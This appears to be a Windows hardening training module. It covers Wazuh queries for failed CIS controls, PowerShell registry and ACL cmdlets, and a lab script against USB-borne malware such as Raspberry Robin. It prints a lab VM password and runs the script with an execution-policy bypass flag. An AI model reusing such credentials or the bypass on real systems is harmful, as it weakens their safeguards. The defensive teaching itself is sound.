4. Select the Absolute tab, and set the time range from September 12, 2022 @ 00:00:00.000 to September 12, 2022 @ 23:30:00.000:

﻿<img width="710" height="379" alt="image" src="https://github.com/user-attachments/assets/d7a7cf1b-1709-4b87-97d9-cebf77a178ec" />

5. Enter the following field names, one at a time, for filtering in the Search field names box. As the field name appears in the Available fields area, hover the mouse over the name and select the blue plus (+) sign to add it to the Results pane.
data.sca.check.description
data.sca.check.result

<img width="295" height="230" alt="image" src="https://github.com/user-attachments/assets/29b5e2de-d8d2-4b17-93ee-f8d8359911b4" />




6. Enter the following query in the query search box to locate security controls that have not yet been implemented on this system. The controls are marked as failed because they are recommended but have not been configured.
agent.name:"cda-win-hunt" AND data.sca.check.result:"failed" AND rule.cis:18.9.8.3


7. Review the data.sca.check.remediation field to discover how to disable Autoplay. Autoplay is the underlying feature that automatically executes files stored on USB drives from the autorun.inf file.


8. Review the other controls, such as 18.9.47.12.1, which is responsible for scanning USB devices when an antivirus scan is executed, and 18.9.8.1, which disables Autoplay for devices like cameras or phones by updating the query, replacing the value for the rule.cis field with these identifiers.


9. Create a short document explaining which controls should be implemented and what the potential drawbacks of doing so are. (This is an exercise for discussion.) The Center for Internet Security (CIS) Microsoft Windows 10 Enterprise Benchmark (attached) can be used as a resource if navigation of the Wazuh interface is difficult. Some examples of explanations are as follows:


Example 1
18.9.8.3 (L1) Ensure 'Turn off Autoplay' is set to 'Enabled: All drives' (Automated) would disable any USB drives from being able to auto-execute code when they are plugged in. This could make it more difficult for new users of the Windows OS to be able to find their data on removable media, as a pop-up window no longer appears during the insertion of the device, but the security benefit outweighs the inconvenience.


Example 2
18.9.47.12.1 (L1) Ensure 'Scan removable drives' is set to 'Enabled' (Automated) would ensure that USB devices are scanned so that if malware is on a device, it can potentially be detected and cleaned from the device. There really is no downside to enabling antivirus software to scan removable media, and it should be enabled, but it may not prevent the prior incident from occurring.


Example 3
18.9.8.1 (L1) Ensure 'Disallow Autoplay for non-volume devices' is set to 'Enabled' (Automated) would disable Autoplay of cell phones and other devices that potentially contain malicious software. Such applications as iTunes might have difficulty detecting a device if Autoplay is enabled, but if iTunes is not installed on the endpoint, then Autoplay is not hindering the functionality of the device and should be enabled.

<img width="1145" height="708" alt="image" src="https://github.com/user-attachments/assets/7001d985-2902-420a-9f88-19289541d9aa" />

------------------

Hardening Automation
Windows PowerShell is a powerful tool that can automate almost any task and that can simplify configurations made to a system. PowerShell is an extremely helpful tool when analysts are hardening multiple systems in a Windows environment.  

﻿

A few cmdlets that can assist analysts with configuring host security settings exist by default in PowerShell. 

﻿

Registry Cmdlets
﻿

Windows allows analysts to get, add, change, and delete registry keys and values within PowerShell. One of the most useful cmdlets lists all the subkeys of a registry key. The syntax for the cmdlet is Get-ChildItem -Path. After the -Path parameter, the analyst specifies the registry path of the desired subkeys. An example of the Get-ChildItem -Path command is as follows:  

Get-ChildItem -Path HKCU:\ | Select-Object -Name
﻿

The Copy-Item cmdlet copies registry keys from one location to another. In the following example,  the CurrentVersion subkey is copied from one location in the registry to another:

Copy-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion' -Destination HKCU:  
﻿

Registry keys may also be created and deleted using cmdlets. The formats to create and delete a registry key are New-Item -Path and Remove-Item -Path, respectively, where -Path represents the explicit registry path to be changed.

﻿

Access Control List Cmdlets
﻿

PowerShell allows analysts to view Access Control List (ACL) items via the Get cmdlet. The Get-Acl cmdlet allows analysts to get the security descriptor for a resource such as a file or a registry key. The security descriptor contains the ACLs of the specified resource. The ACL specifies user and group permissions to access the specified resource. The following is an example of the cmdlet that gets the security descriptor of the C:\Windows directory:

Get-Acl C:\Windows 
﻿

PowerShell also has a cmdlet that allows analysts to change the security descriptor of a specified item by using the Set-Acl cmdlet. The Set-Acl cmdlet can be used to set the values of an item such as a file or registry key to match the values in a security descriptor that an analyst supplies.  

﻿

When using the Set-Acl cmdlet, the analyst must use the -Path parameter to identify the full path and item whose security descriptor is to be changed. The AclObject or SecurityDescriptor parameter is used to identify the values that an analyst wishes to apply. Set-Acl applies the security descriptor that is supplied. An example of this command is as follows:

Get-Acl -Path "C:\secret.txt" | Set-Acl -Path "C:\log.txt"
﻿

The above command uses the | operator to send the security descriptor using the Get-Acl command to a Set-Acl command. The Get-Acl command gets the security descriptor of the secret.txt file and passes it to the Set-Acl cmdlet, which applies the security descriptor to the log.txt file. 

﻿

Managing Services Cmdlets
﻿

PowerShell has built-in cmdlets that analysts can use to manage services. They can be used to list and change running states for services or to edit, stop, and start a service. 

﻿

One service-related cmdlet is the Get-Service cmdlet, which can get the services on local or remote computers. Using Get-Service by itself, with no parameters, returns all services. Some parameters that can be used with this cmdlet are -Name, -DisplayName, and the asterisk (*) as a wildcard. An example of using this cmdlet with the -Name parameter and a wildcard to filter the results is as follows:

Get-Service -Name se* 
﻿

Using the same Get-Service cmdlet, the parameter -ComputerName may be used to get the services on a remote workstation. The -ComputerName parameter accepts multiple values and wildcards to get the services of multiple workstations. Newer versions of PowerShell require analysts to use PowerShell remoting cmdlets to get the services on remote computers. An example is as follows:

Invoke-Command -ComputerName Server02 -ScriptBlock { Get-Service } 
﻿

Cmdlets are also available to stop, start, suspend, and restart services. They all include the parameter -Name to modify the service specified by the analyst. The following provides the cmdlet syntax for each of the stop, start, suspend, and restart services:   


Stop-Service -Name spooler

Start-Service -Name spooler

Suspend-Service -Name spooler

Restart-Service -Name spooler
﻿

Creating PowerShell Scripts from CIS Documentation
﻿

The CIS hardening benchmarks specify which registry key is tied to the control and how to enable the control through group policy. A control can be enabled directly through the registry instead of needing to use the group policy editor. The following provides an example of interpreting the CIS benchmarks documents. This offers an introduction to creation of scripts specific to the environment that requires hardening.

﻿

In the CIS Microsoft Windows 10 Enterprise Benchmark (attached), the full registry path for a given control is located under the Audit section for that control. The item after the colon in the path is the key, to be assigned a value of 1 for enabled or 0 for disabled. Occasionally, the value specified is something other than 0 or 1, depending on the need. Figure 25.2-3 shows the Audit section for control 18.9.47.4.2 (L2) Ensure 'Join Microsoft MAPS' is set to 'Disabled' in the CIS hardening benchmarks:

﻿<img width="676" height="173" alt="image" src="https://github.com/user-attachments/assets/3d2be2a7-5313-4a80-96ce-9996c76bc851" />


As Figure 25.2-3 shows, the path for this control is HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet:SpynetReporting. The key is SpynetReporting, and its value, according to the document, must either not exist or must be set to 0 for the control to be disabled. When developing the PowerShell script, some nuances exist; for example, the HKEY_LOCAL_MACHINE path is abbreviated as HKLM. Also, the CIS benchmark shows SOFTWARE as all uppercase, but Software is also acceptable. An example of the full command to implement this control using PowerShell is as follows:
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0



If a path does not currently exist in the registry, it can be created with the New-Item -Path cmdlet. As an example, if no Spynet folder is in the registry at HKLM:\Software\Policies\Microsoft\Windows Defender\, a new folder can be created using the following command:
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet"



The full path must exist before New-ItemProperty can be created. 


Sometimes the key already exists, and PowerShell refuses to overwrite the value. In such instances, it is recommended to use the -Force option, as illustrated below:
New-ItemProperty -Force -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0



A PowerShell script may contain dozens of controls similar to the above that can be used on many different hosts to quickly remediate a selected defined list of controls.


Additional Tools


The security industry has created many tools and scripts to assist with hardening, but selecting the right one based on each organization’s requirements can be challenging. Some available tools are listed in the Additional Resources area below.


PowerShell is not the only way to implement OS hardening. Another method is through use of the Security Content Automation Protocol (SCAP), from the National Institute of Standards and Technology (NIST) Computer Security Resource Center (SCRC). SCAP is an automated vulnerability and compliance checker that includes a catalog of controls recommended for all systems. The U.S. federal government relies on SCAP for its security assessments and implementation of securing its most critical systems.


Analysts can download the SCAP version that correlates with the OS version in use. They may then download and install the Security Technical Implementation Guides (STIG) benchmarks to apply to the environment, based on the software and OS being used in the environment. For example, the SCAP tool may be installed on a Windows machine, and then the STIG benchmarks may be installed for the software on the system, such as Google Chrome or Microsoft Defender. Once the SCAP tool and any associated benchmarks are installed on a system, an analyst may run the SCAP tool to receive a score on the system’s security. The tool also provides a list of vulnerabilities present in the system and ways to patch the vulnerabilities.



--------------


Create a PowerShell Hardening Script
Scenario: A Windows endpoint was recently compromised by the malware Raspberry Robin. This malware executes as soon as an infected USB drive is plugged in. 

﻿

Complete the steps in the following lab to write a PowerShell script to change control settings so that the activity is blocked from occurring in the future. The following are the four controls that might be implemented to prevent this action in the future:

18.9.8.1 (L1) Ensure 'Disallow Autoplay for non-volume devices' is set to 'Enabled' (Automated): Computer Configuration\Policies\Administrative Templates\Windows Components\AutoPlay Policies\Disallow Autoplay for non-volume devices 

18.9.8.2 (L1) Ensure 'Set the default behavior for AutoRun' is set to 'Enabled: Do not execute any autorun commands' (Automated): HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer:NoAutorun 

18.9.8.3 (L1) Ensure 'Turn off Autoplay' is set to 'Enabled: All drives' (Automated): Computer Configuration\Policies\Administrative Templates\Windows Components\AutoPlay Policies\Turn off Autoplay

18.9.47.12.1 (L1) Ensure 'Scan removable drives' is set to 'Enabled' (Automated): Computer Configuration\Policies\Administrative Templates\Windows Components\Microsoft Defender Antivirus\Scan\Scan removable drives 

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell ISE from the desktop as Administrator by right-clicking and selecting Run as Administrator. When prompted by the app to make changes to the device, select Yes.

﻿

Once PowerShell ISE opens, enter the following lines to remediate two of the four security controls stated above. These remediation paths and values come directly from the CIS Microsoft Windows 10 Enterprise Benchmark (attached).

﻿


```powershell
#18.9.47.12.1
if (Test-Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan"){
    New-ItemProperty -Force -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan" -Name DisableRemovableDriveScanning -Value 0
}
else {
    New-Item -Force -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan"
    New-ItemProperty -Force -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Scan" -Name DisableRemovableDriveScanning -Value 0
}

#18.9.8.2
if (Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"){
    New-ItemProperty -Force -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoAutorun -Value 1
}
else {
    New-Item -Force -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    New-ItemProperty -Force -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoAutorun -Value 1
}
```

NOTE: If copying and pasting the above results in issues, open the file C:\Users\Trainee\Documents\Commands.txt, copy the content, and paste it into PowerShell ISE.

﻿

3. Save the file as hardening.ps1 in C:\Users\Trainee\Documents.

﻿

4. In PowerShell ISE, in the blue (bottom) pane of the UI, execute the following command to run the hardening script and implement the changes to the system:

powershell.exe -ep bypass C:\Users\trainee\Documents\hardening.ps1
﻿

Confirm that at least one of the values was set by completing the next steps.

﻿

5. Go to the Start menu, enter regedit, and open the Registry Editor. When prompted to allow changes to the system, select yes.

﻿

6. Expand the hive HKEY_LOCAL_MACHINE to Software\Microsoft\Windows\CurrentVersion\Policies\Explorer, and confirm that a new key named NoAutorun with a value of 1 was created.

﻿

Use this workflow to answer the following question.

<img width="1080" height="475" alt="image" src="https://github.com/user-attachments/assets/9950bec8-075d-441f-9ce4-bb1792313fef" />

---------------












































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































